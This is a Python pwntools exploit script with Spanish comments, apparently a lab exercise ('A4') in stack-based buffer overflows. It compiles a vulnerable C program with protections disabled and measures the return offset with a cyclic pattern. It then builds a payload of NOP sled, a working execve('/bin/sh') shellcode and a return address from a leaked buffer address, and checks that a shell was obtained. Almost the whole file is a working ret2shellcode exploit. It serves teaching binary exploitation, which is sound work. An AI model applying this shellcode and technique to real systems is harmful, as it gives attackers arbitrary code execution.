#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A4 - ret2shellcode con -z execstack: shell execve("/bin/sh") en el stack.
Flujo: compilar con pila ejecutable -> leer leak -> payload = NOP sled +
shellcode + ret->sled -> comprobar el shell con un comando. TODO dinamico.
USO: python3 a4_shellcode.py"""
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

BIN = './a4_shellcode'

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-z', 'execstack', '-o', BIN, 'a4_shellcode.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

elf = ELF(BIN, checksec=False)

# Shellcode execve("/bin/sh", NULL, NULL) para amd64 - 23 bytes, sin 0x0a
shellcode = (
    b'\x48\x31\xf6'                              # xor  rsi, rsi
    b'\x56'                                      # push rsi          (NUL)
    b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68'  # mov  rdi, '//bin/sh'
    b'\x57'                                      # push rdi
    b'\x54'                                      # push rsp
    b'\x5f'                                      # pop  rdi   -> &"/bin/sh"
    b'\x6a\x3b'                                  # push 0x3b  (execve=59)
    b'\x58'                                      # pop  rax
    b'\x99'                                      # cdq        (rdx=0)
    b'\x0f\x05'                                  # syscall
)
assert b'\n' not in shellcode, 'el shellcode no puede contener 0x0a'
log.info('Shellcode cargado: %d bytes', len(shellcode))

# FASE 1 - medir el offset dinamicamente (cyclic + corefile)
io2 = process(BIN)
io2.recvuntil(b'leak: buffer en ')
io2.recvline()                       # descartar el leak de esta corrida
io2.sendline(cyclic(300))
io2.wait()
try:
    core = io2.corefile
    offset = cyclic_find(core.read(core.rsp, 4))
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io2.close()
log.info('Offset hasta el ret: %d bytes', offset)

# FASE 2 - exploit real contra un proceso limpio
io = process(BIN)
io.recvuntil(b'leak: buffer en ')
leak_linea = io.recvline().strip()   # direccion REAL, no la de GDB
buf_addr = int(leak_linea, 16)
log.info('Leak parseado: buffer[] vive en %#x', buf_addr)

NOP_SLED = 96                        # 96 x 0x90: aterrizaje amortiguado
ret_addr = buf_addr + NOP_SLED // 2  # apuntar a MITAD del sled
while b'\n' in p64(ret_addr):        # por si un byte de la direccion es 0x0a
    ret_addr += 8
assert buf_addr <= ret_addr < buf_addr + NOP_SLED, 'ret debe caer en el sled'

payload = b'\x90' * NOP_SLED + shellcode
payload += b'B' * (offset - len(payload))    # relleno hasta el ret guardado
payload += p64(ret_addr)
assert b'\n' not in payload, 'gets() cortaria el payload en el primer 0x0a'
assert len(payload) <= 255, 'payload demasiado largo para gets() aqui'

io.sendline(payload)                 # gets() copia TODO hasta el \n
time.sleep(0.3)                      # dejar aterrizar el ret en el sled
io.sendline(b'echo PWNED_A4_$(id -u); exit')   # prueba de vida del shell
salida = io.recvall(timeout=3)
io.close()

if b'PWNED_A4' in salida:
    log.success('A4 SUPERADO: shellcode ejecutado, /bin/sh bajo tu control.')
    log.info('El ret salto a %#x (mitad del sled) y la CPU ejecuto 0x90... '
             'hasta llegar al execve.', ret_addr)
else:
    log.failure('A4: sin shell. Pistas: verifica -z execstack (pwn checksec), '
                'ASLR con setarch -R y el leak parseado.')
